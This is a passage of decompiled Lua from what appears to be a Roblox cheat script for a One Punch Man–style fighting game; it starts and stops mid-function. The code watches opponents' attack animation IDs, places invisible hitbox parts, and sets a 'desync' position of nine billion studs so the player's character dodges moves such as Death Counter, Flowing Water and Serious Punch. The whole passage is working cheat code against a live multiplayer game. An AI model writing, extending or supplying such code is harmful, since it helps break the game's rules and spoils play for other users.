                                                v976.CanCollide = false;
                                                v976.Transparency = 1;
                                                local v977 = false;
                                                local v979 = v976.Touched:Connect(function(v978) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), v977 (ref)
                                                    if v978 == v939 then
                                                        v977 = true;
                                                    end;
                                                end);
                                                local v981 = v976.TouchEnded:Connect(function(v980) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), v977 (ref)
                                                    if v980 == v939 then
                                                        v977 = false;
                                                    end;
                                                end);
                                                if l_Value_14 then
                                                    task.wait(0.1);
                                                    v976.CFrame = v885.CFrame * CFrame.new(0, 0, -v976.Size.Z / 2);
                                                    task.wait();
                                                    if v977 and not isCountering(v940) then
                                                        bdcancel();
                                                    end;
                                                    v976:Destroy();
                                                    v979:Disconnect();
                                                    v981:Disconnect();
                                                    return;
                                                else
                                                    local v982 = tick();
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] UPPERCUT");
                                                        end;
                                                        v976.CFrame = v885.CFrame * CFrame.new(0, 0, -v976.Size.Z / 2);
                                                        if v977 == true and not isCountering(v940) then
                                                            repeat
                                                                if antidebug then
                                                                    warn("[ANTI DEBUG] UPPERCUT");
                                                                end;
                                                                v976.CFrame = v885.CFrame * CFrame.new(0, 0, -v976.Size.Z / 2);
                                                                getgenv().desync = {
                                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                                };
                                                                task.wait();
                                                            until v977 == false or tick() >= v982 + 0.5 or not v936.IsPlaying or isCountering(v940);
                                                            getgenv().desync = nil;
                                                        end;
                                                        l_RenderStepped_0:Wait();
                                                    until tick() >= v982 + 0.5 or not v936.IsPlaying;
                                                    getgenv().desync = nil;
                                                    if v976 then
                                                        v976:Destroy();
                                                    end;
                                                    v979:Disconnect();
                                                    v981:Disconnect();
                                                    --[[ close >= 0 ]]
                                                end;
                                            end;
                                        elseif l_AnimationId_1:match("11343318134") and rawget(Options.AntiMoves_Saitama.Value, "Anti Death Counter") then
                                            task.wait(7.5);
                                            local v983 = Instance.new("Part", l_Workspace_0);
                                            v983.Anchored = true;
                                            v983.Size = Vector3.new(125, 5, 500);
                                            v983.CanCollide = false;
                                            v983.Transparency = 1;
                                            local v984 = Instance.new("Part", l_Workspace_0);
                                            v984.Anchored = true;
                                            v984.Size = Vector3.new(125, 5, 500);
                                            v984.CanCollide = false;
                                            v984.Transparency = 1;
                                            local v985 = Instance.new("Part", l_Workspace_0);
                                            v985.Anchored = true;
                                            v985.Size = Vector3.new(125, 5, 500);
                                            v985.CanCollide = false;
                                            v985.Transparency = 1;
                                            local v986 = false;
                                            local v987 = false;
                                            local v988 = false;
                                            local v989 = {};
                                            if true then
                                                local l_v986_0, l_v987_0, l_v988_0 = v986, v987, v988;
                                                table.insert(v989, v983.Touched:Connect(function(v993) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v986_0 (ref)
                                                    if v993 == v939 then
                                                        l_v986_0 = true;
                                                    end;
                                                end));
                                                table.insert(v989, v983.TouchEnded:Connect(function(v994) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v986_0 (ref)
                                                    if v994 == v939 then
                                                        l_v986_0 = false;
                                                    end;
                                                end));
                                                table.insert(v989, v984.Touched:Connect(function(v995) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v987_0 (ref)
                                                    if v995 == v939 then
                                                        l_v987_0 = true;
                                                    end;
                                                end));
                                                table.insert(v989, v984.TouchEnded:Connect(function(v996) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v987_0 (ref)
                                                    if v996 == v939 then
                                                        l_v987_0 = false;
                                                    end;
                                                end));
                                                table.insert(v989, v985.Touched:Connect(function(v997) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v988_0 (ref)
                                                    if v997 == v939 then
                                                        l_v988_0 = true;
                                                    end;
                                                end));
                                                table.insert(v989, v985.TouchEnded:Connect(function(v998) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v988_0 (ref)
                                                    if v998 == v939 then
                                                        l_v988_0 = false;
                                                    end;
                                                end));
                                                local v999 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] DEATH COUNTER");
                                                    end;
                                                    v983.CFrame = v885.CFrame * CFrame.new(60, 0, -v983.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(-15), 0);
                                                    v984.CFrame = v885.CFrame * CFrame.new(-60, 0, -v984.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(15), 0);
                                                    v985.CFrame = v885.CFrame * CFrame.new(0, 0, -v985.Size.Z / 2 + 1.5);
                                                    if l_v986_0 or l_v987_0 or l_v988_0 or touchingMiddle then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] DEATH COUNTER");
                                                            end;
                                                            v983.CFrame = v885.CFrame * CFrame.new(60, 0, -v983.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(-15), 0);
                                                            v984.CFrame = v885.CFrame * CFrame.new(-60, 0, -v984.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(15), 0);
                                                            v985.CFrame = v885.CFrame * CFrame.new(0, 0, -v985.Size.Z / 2 + 1.5);
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until not l_v986_0 and not l_v987_0 and not l_v988_0 and not touchingMiddle or tick() >= v999 + 2.5 or not v936.IsPlaying;
                                                        getgenv().desync = nil;
                                                    end;
                                                    l_RenderStepped_0:Wait();
                                                until tick() >= v999 + 2.5 or not v936.IsPlaying;
                                                getgenv().desync = nil;
                                                v983:Destroy();
                                                v984:Destroy();
                                                v985:Destroy();
                                                for _, v1001 in pairs(v989) do
                                                    v1001:Disconnect();
                                                end;
                                            end;
                                        elseif l_AnimationId_1:match("12272894215") and rawget(Options.AntiMoves_Garou.Value, "Anti Flowing Water") then
                                            local v1002 = Instance.new("Part", l_Workspace_0);
                                            v1002.Anchored = true;
                                            v1002.Size = Vector3.new(10, 5, 10);
                                            v1002.CanCollide = false;
                                            v1002.Transparency = 1;
                                            local v1003 = false;
                                            local v1005 = v1002.Touched:Connect(function(v1004) --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: v939 (ref), v1003 (ref)
                                                if v1004 == v939 then
                                                    v1003 = true;
                                                end;
                                            end);
                                            local v1007 = v1002.TouchEnded:Connect(function(v1006) --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: v939 (ref), v1003 (ref)
                                                if v1006 == v939 then
                                                    v1003 = false;
                                                end;
                                            end);
                                            if l_Value_14 then
                                                v1002.CFrame = v885.CFrame * CFrame.new(0, 0, -v1002.Size.Z / 2);
                                                task.wait();
                                                if v1003 and not isCountering(v940) then
                                                    bdcancel();
                                                end;
                                                v1002:Destroy();
                                                v1005:Disconnect();
                                                v1007:Disconnect();
                                                return;
                                            else
                                                local v1008 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] FLOWING WATER");
                                                    end;
                                                    v1002.CFrame = v885.CFrame * CFrame.new(0, 0, -v1002.Size.Z / 2);
                                                    if v1003 == true and not isCountering(v940) then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] FLOWING WATER");
                                                            end;
                                                            v1002.CFrame = v885.CFrame * CFrame.new(0, 0, -v1002.Size.Z / 2);
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until v1003 == false or tick() >= v1008 + 0.5 or not v936.IsPlaying or isCountering(v940);
                                                        getgenv().desync = nil;
                                                    end;
                                                    l_RenderStepped_0:Wait();
                                                until tick() >= v1008 + 0.5 or not v936.IsPlaying;
                                                getgenv().desync = nil;
                                                if v1002 then
                                                    v1002:Destroy();
                                                end;
                                                v1005:Disconnect();
                                                v1007:Disconnect();
                                                --[[ close >= 0 ]]
                                            end;
                                        elseif l_AnimationId_1:match("12273188754") and rawget(Options.AntiMoves_Garou.Value, "Anti Flowing Water") then
                                            local v1009 = Instance.new("Part", l_Workspace_0);
                                            v1009.Anchored = true;
                                            v1009.Size = Vector3.new(15, 5, 15);
                                            v1009.CanCollide = false;
                                            v1009.Transparency = 1;
                                            local v1010 = false;
                                            if true then
                                                local l_v1010_0 = v1010;
                                                local v1013 = v1009.Touched:Connect(function(v1012) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v1010_0 (ref)
                                                    if v1012 == v939 then
                                                        l_v1010_0 = true;
                                                    end;
                                                end);
                                                local v1015 = v1009.TouchEnded:Connect(function(v1014) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v1010_0 (ref)
                                                    if v1014 == v939 then
                                                        l_v1010_0 = false;
                                                    end;
                                                end);
                                                local v1016 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] FLOWING WATER HIT");
                                                    end;
                                                    v1009.CFrame = v885.CFrame * CFrame.new(0, 0, -v1009.Size.Z / 2);
                                                    if l_v1010_0 == true and not isCountering(v940) then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] FLOWING WATER HIT");
                                                            end;
                                                            v1009.CFrame = v885.CFrame * CFrame.new(0, 0, -v1009.Size.Z / 2);
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until l_v1010_0 == false or tick() >= v1016 + 2 or not v936.IsPlaying or isCountering(v940);
                                                        getgenv().desync = nil;
                                                    end;
                                                    l_RenderStepped_0:Wait();
                                                until tick() >= v1016 + 2 or not v936.IsPlaying;
                                                getgenv().desync = nil;
                                                if v1009 then
                                                    v1009:Destroy();
                                                end;
                                                v1013:Disconnect();
                                                v1015:Disconnect();
                                            end;
                                        elseif l_AnimationId_1:match("14374357351") and rawget(Options.AntiMoves_Garou.Value, "Anti Flowing Water") then
                                            local v1017 = Instance.new("Part", l_Workspace_0);
                                            v1017.Anchored = true;
                                            v1017.Size = Vector3.new(10, 5, 15);
                                            v1017.CanCollide = false;
                                            v1017.Transparency = 1;
                                            local v1018 = false;
                                            if true then
                                                local l_v1018_0 = v1018;
                                                local v1021 = v1017.Touched:Connect(function(v1020) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v1018_0 (ref)
                                                    if v1020 == v939 then
                                                        l_v1018_0 = true;
                                                    end;
                                                end);
                                                local v1023 = v1017.TouchEnded:Connect(function(v1022) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v1018_0 (ref)
                                                    if v1022 == v939 then
                                                        l_v1018_0 = false;
                                                    end;
                                                end);
                                                local v1024 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] FLOWING WATER FINISHER");
                                                    end;
                                                    v1017.CFrame = v885.CFrame * CFrame.new(0, 0, -v1017.Size.Z / 2);
                                                    if l_v1018_0 == true and not isCountering(v940) then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] FLOWING WATER FINISHER");
                                                            end;
                                                            v1017.CFrame = v885.CFrame * CFrame.new(0, 0, -v1017.Size.Z / 2);
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until l_v1018_0 == false or tick() >= v1024 + 1.5 or not v936.IsPlaying or isCountering(v940);
                                                        getgenv().desync = nil;
                                                    end;
                                                    l_RenderStepped_0:Wait();
                                                until tick() >= v1024 + 1.5 or not v936.IsPlaying;
                                                getgenv().desync = nil;
                                                if v1017 then
                                                    v1017:Destroy();
                                                end;
                                                v1021:Disconnect();
                                                v1023:Disconnect();
                                                task.wait(0.5);
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] FLOWING WATER FINISHER");
                                                    end;
                                                    if (v939.Position - v885.Position).Magnitude <= 25 then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] FLOWING WATER FINISHER");
                                                            end;
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until (v939.Position - v885.Position).Magnitude > 25 or tick() >= v1024 + 2.75;
                                                        getgenv().desync = nil;
                                                    end;
                                                    task.wait();
                                                until tick() >= v1024 + 2.75;
                                                getgenv().desync = nil;
                                            end;
                                        elseif l_AnimationId_1:match("12296882427") and rawget(Options.AntiMoves_Garou.Value, "Anti Lethal Whirlwind Stream") then
                                            if l_Value_14 and (v939.Position - (v885.CFrame * CFrame.new(0, 0, -2.5)).Position).Magnitude <= 10 and not isCountering(v940) then
                                                bdcancel();
                                                return;
                                            else
                                                local v1025 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] LETHAL WHIRLWIND STREAM");
                                                    end;
                                                    if (v939.Position - (v885.CFrame * CFrame.new(0, 0, -2.5)).Position).Magnitude <= 10 and not isCountering(v940) then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] LETHAL WHIRLWIND STREAM");
                                                            end;
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until (v939.Position - (v885.CFrame * CFrame.new(0, 0, -2.5)).Position).Magnitude > 10 or tick() >= v1025 + 0.5 or isCountering(v940);
                                                        getgenv().desync = nil;
                                                    end;
                                                    task.wait();
                                                until tick() >= v1025 + 0.5;
                                                getgenv().desync = nil;
                                            end;
                                        elseif l_AnimationId_1:match("12296113986") and rawget(Options.AntiMoves_Garou.Value, "Anti Lethal Whirlwind Stream") then
                                            task.delay(1.35, function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: v939 (ref), v885 (ref)
                                                local v1026 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] LETHAL WHIRLWIND STREAM HIT");
                                                    end;
                                                    if (v939.Position - v885.Position).Magnitude <= 15 then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] LETHAL WHIRLWIND STREAM HIT");
                                                            end;
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until (v939.Position - v885.Position).Magnitude > 15 or tick() >= v1026 + 0.65;
                                                        getgenv().desync = nil;
                                                    end;
                                                    task.wait();
                                                until tick() >= v1026 + 0.65;
                                                getgenv().desync = nil;
                                            end);
                                            local v1027 = tick();
                                            if (v939.Position - v885.Position).Magnitude <= 15 then
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] LETHAL WHIRLWIND STREAM HIT");
                                                    end;
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    };
                                                    task.wait();
                                                until tick() >= v1027 + 0.5;
                                                getgenv().desync = nil;
                                            end;
                                        elseif l_AnimationId_1:match("14798608838") and rawget(Options.AntiMoves_Garou.Value, "Anti Lethal Whirlwind Stream") then
                                            task.delay(0.75, function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: v939 (ref), v885 (ref)
                                                local v1028 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] LETHAL WHIRLWIND STREAM FINISHER");
                                                    end;
                                                    if (v939.Position - v885.Position).Magnitude <= 25 then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] LETHAL WHIRLWIND STREAM FINISHER");
                                                            end;
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until (v939.Position - v885.Position).Magnitude > 25 or tick() >= v1028 + 0.75;
                                                        getgenv().desync = nil;
                                                    end;
                                                    task.wait();
                                                until tick() >= v1028 + 0.75;
                                                getgenv().desync = nil;
                                            end);
                                        elseif l_AnimationId_1:match("12307656616") and rawget(Options.AntiMoves_Garou.Value, "Anti Hunters Grasp") then
                                            local v1029 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] HUNTERS GRASP");
                                                end;
                                                if (v939.Position - (v885.CFrame * CFrame.new(0, 0, -2.5)).Position).Magnitude <= 10 and not isCountering(v940) then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] HUNTERS GRASP");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - (v885.CFrame * CFrame.new(0, 0, -2.5)).Position).Magnitude > 10 or tick() >= v1029 + 0.35 or isCountering(v940);
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1029 + 0.35;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("13603396939") and rawget(Options.AntiMoves_Garou.Value, "Anti Preys Peril") then
                                            local v1030 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 2");
                                                end;
                                                if (v939.Position - (v885.CFrame * CFrame.new(0, 0, -1)).Position).Magnitude <= 7.5 then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 2");
                                                        end;
                                                        if not isCountering(v940) then
                                                            repeat
                                                                if antidebug then
                                                                    warn("[ANTI DEBUG] 2");
                                                                end;
                                                                getgenv().desync = {
                                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                                };
                                                                task.wait();
                                                            until isCountering(v940) or (v939.Position - (v885.CFrame * CFrame.new(0, 0, -1)).Position).Magnitude > 7.5 or tick() >= v1030 + 2.5;
                                                            getgenv().desync = nil;
                                                        end;
                                                        task.wait();
                                                    until (v939.Position - (v885.CFrame * CFrame.new(0, 0, -1)).Position).Magnitude > 7.5 or tick() >= v1030 + 2.5;
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1030 + 2.75;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("16515850153") and rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Windstorm Fury") then
                                            task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: v939 (ref), v885 (ref), l_l_UserInputService_0_0 (ref), v938 (ref)
                                                if (v939.Position - v885.Position).Magnitude <= 15 then
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    };
                                                end;
                                                local v1031 = l_l_UserInputService_0_0:WaitForChild("Dotted", 1);
                                                if v1031 then
                                                    local v1032 = v1031:WaitForChild("Dots", 1);
                                                    if v1032 then
                                                        local v1033 = tick();
                                                        if (v939.Position - v1032.Position).Magnitude > 20 then
                                                            getgenv().desync = nil;
                                                        end;
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] 3");
                                                            end;
                                                            if (v939.Position - v1032.Position).Magnitude <= 20 and not isDeathCountering(v938) then
                                                                repeat
                                                                    if antidebug then
                                                                        warn("[ANTI DEBUG] 3");
                                                                    end;
                                                                    getgenv().desync = {
                                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                                    };
                                                                    task.wait();
                                                                until (v939.Position - v1032.Position).Magnitude > 20 or tick() >= v1033 + 4.25 or isDeathCountering(v938);
                                                                getgenv().desync = nil;
                                                            end;
                                                            task.wait();
                                                        until tick() >= v1033 + 4.25;
                                                        getgenv().desync = nil;
                                                    end;
                                                elseif not v1031 then
                                                    getgenv().desync = nil;
                                                end;
                                            end);
                                        elseif l_AnimationId_1:match("16431491215") and rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Stone Grave") then
                                            task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: v939 (ref), v885 (ref), v940 (ref)
                                                local v1034 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 4");
                                                    end;
                                                    if (v939.Position - (v885.CFrame * CFrame.new(0, 0, -25)).Position).Magnitude <= 25 and not isCountering(v940) then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] 4");
                                                            end;
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until (v939.Position - (v885.CFrame * CFrame.new(0, 0, -20)).Position).Magnitude > 25 or tick() >= v1034 + 0.75 or isCountering(v940);
                                                        getgenv().desync = nil;
                                                    end;
                                                    task.wait();
                                                until tick() >= v1034 + 0.75;
                                                getgenv().desync = nil;
                                            end);
                                        elseif l_AnimationId_1:match("16597912086") and rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Expulsive Push") then
                                            local v1035 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 5");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 15 and not isCountering(v940) then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 5");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 15 or tick() >= v1035 + 0.75 or isCountering(v940);
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1035 + 0.75;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("13813955149") and Toggles.AntiMoves_Trashcan.Value then
                                            if (v939.Position - v885.Position).Magnitude <= 25 then
                                                if l_Value_14 then
                                                    bdcancel();
                                                    task.wait();
                                                    v942 = tick() >= start + 2;
                                                end;
                                                if not v942 then
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    };
                                                    task.wait(0.75);
                                                    getgenv().desync = nil;
                                                end;
                                            end;
                                            v942 = false;
                                            local v1036 = nil;
                                            if true then
                                                local l_v1036_0 = v1036;
                                                l_v1036_0 = l_l_UserInputService_0_0.ChildAdded:Connect(function(v1038) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: l_v1036_0 (ref), v939 (ref), l_Value_14 (ref)
                                                    if v1038:IsA("MeshPart") and v1038.Name:lower() == "trash can" then
                                                        l_v1036_0:Disconnect();
                                                        local v1039 = tick();
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] 6");
                                                            end;
                                                            if (v939.Position - v1038.Position).Magnitude <= 25 then
                                                                if l_Value_14 then
                                                                    bdcancel();
                                                                    repeat
                                                                        task.wait();
                                                                    until tick() >= v1039 + 2;
                                                                else
                                                                    repeat
                                                                        if antidebug then
                                                                            warn("[ANTI DEBUG] 6");
                                                                        end;
                                                                        getgenv().desync = {
                                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                                        };
                                                                        task.wait();
                                                                    until (v939.Position - v1038.Position).Magnitude > 25 or tick() >= v1039 + 2;
                                                                    getgenv().desync = nil;
                                                                end;
                                                            end;
                                                            task.wait();
                                                        until tick() >= v1039 + 2;
                                                        getgenv().desync = nil;
                                                    end;
                                                end);
                                            end;
                                        elseif l_AnimationId_1:match("11365563255") and v884:GetAttribute("Ulted") ~= nil then
                                            MoveNotify(v879, "Table Flip");
                                            task.delay(1, function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: v884 (ref)
                                                if v884:FindFirstChild("AbsoluteImmortal", true) and v884:FindFirstChild("Freeze") then
                                                    task.wait(3);
                                                    if rawget(Options.AntiMoves_Saitama.Value, "Anti Table Flip") then
                                                        local v1040 = tick();
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] 7");
                                                            end;
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until tick() >= v1040 + 2.5;
                                                        getgenv().desync = nil;
                                                    end;
                                                end;
                                            end);
                                        elseif l_AnimationId_1:match("12983333733") and v884:GetAttribute("Ulted") ~= nil then
                                            MoveNotify(v879, "Serious Punch");
                                            task.delay(1, function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: v884 (ref)
                                                if v884:FindFirstChild("AbsoluteImmortal", true) and v884:FindFirstChild("Freeze") then
                                                    task.wait(4.25);
                                                    if rawget(Options.AntiMoves_Saitama.Value, "Anti Serious Punch") then
                                                        local v1041 = tick();
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] 8");
                                                            end;
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until tick() >= v1041 + 2;
                                                        getgenv().desync = nil;
                                                    end;
                                                end;
                                            end);
                                        elseif l_AnimationId_1:match("13927612951") and v884:GetAttribute("Ulted") ~= nil then
                                            MoveNotify(v879, "Omni-Directional Punch");
                                            if rawget(Options.AntiMoves_Saitama.Value, "Anti Omni-Directional Punch") then
                                                local v1042 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 9");
                                                    end;
                                                    if (v939.Position - v885.Position).Magnitude <= 150 then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] 9");
                                                            end;
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until (v939.Position - v885.Position).Magnitude > 150 or tick() >= v1042 + 2.5;
                                                        getgenv().desync = nil;
                                                    end;
                                                    task.wait();
                                                until tick() >= v1042 + 2.5;
                                                getgenv().desync = nil;
                                            end;
                                        elseif l_AnimationId_1:match("14719290328") and rawget(Options.AntiMoves_MetalBat.Value, "Anti Savage Tornado") then
                                            if (v939.Position - v885.Position).Magnitude <= 50 then
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                };
                                            end;
                                            task.wait(0.5);
                                            if v936.IsPlaying then
                                                local v1043 = tick();
                                                if (v939.Position - v885.Position).Magnitude > 50 then
                                                    getgenv().desync = nil;
                                                end;
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 10");
                                                    end;
                                                    if (v939.Position - v885.Position).Magnitude <= 50 and not isDeathCountering(v938) then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] 10");
                                                            end;
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until (v939.Position - v885.Position).Magnitude > 50 or tick() >= v1043 + 3.5 or isDeathCountering(v938);
                                                        getgenv().desync = nil;
                                                    end;
                                                    task.wait();
                                                until tick() >= v1043 + 3.5;
                                                getgenv().desync = nil;
                                            elseif not v936.IsPlaying then
                                                getgenv().desync = nil;
                                            end;
                                        elseif l_AnimationId_1:match("17275150809") and rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Terrible Tornado") then
                                            local v1044 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 11");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 50 then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 11");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 50 or tick() >= v1044 + 1;
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1044 + 1;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("15128849047") and rawget(Options.AntiMoves_MetalBat.Value, "Anti Death Blow") then
                                            MoveNotify(v879, "Death Blow");
                                            local v1045 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 12");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 100 then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 12");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 100 or isAnimPlaying(v886, "15123665491") or tick() >= v1045 + 3;
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until isAnimPlaying(v886, "15123665491") or tick() >= v1045 + 3;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("13376869471") and rawget(Options.AntiMoves_Sonic.Value, "Anti Flash Strike") then
                                            local v1046 = Instance.new("Part", l_Workspace_0);
                                            v1046.Anchored = true;
                                            v1046.Size = Vector3.new(10, 7.5, 60);
                                            v1046.CanCollide = false;
                                            v1046.Transparency = 0;
                                            local v1047 = false;
                                            if true then
                                                local l_v1047_0 = v1047;
                                                local v1050 = v1046.Touched:Connect(function(v1049) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v1047_0 (ref)
                                                    if v1049 == v939 then
                                                        l_v1047_0 = true;
                                                    end;
                                                end);
                                                local v1052 = v1046.TouchEnded:Connect(function(v1051) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v1047_0 (ref)
                                                    if v1051 == v939 then
                                                        l_v1047_0 = false;
                                                    end;
                                                end);
                                                local v1053 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] FLASH STRIKE");
                                                    end;
                                                    v1046.CFrame = v885.CFrame * CFrame.new(0, 0, -v1046.Size.Z / 2);
